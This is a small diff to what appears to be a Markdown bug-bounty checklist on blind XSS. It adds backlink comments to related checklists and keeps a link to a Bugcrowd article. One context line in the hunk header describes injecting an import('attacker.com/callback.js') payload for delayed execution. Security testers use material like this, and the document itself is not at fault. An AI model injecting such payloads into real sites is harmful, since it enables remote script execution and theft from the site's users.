@@ -81,3 +81,9 @@ Inject import('attacker.com/callback.js') payload for delayed execution & env in
 ## 相关案例链接
 
 - https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
+
+<!-- backlink: docs/checklists/cors_postmessage_websocket.md -->
+
+<!-- backlink: docs/checklists/cspt_client_path_traversal.md -->
+
+<!-- backlink: docs/checklists/prototype_pollution_xss_chain.md -->
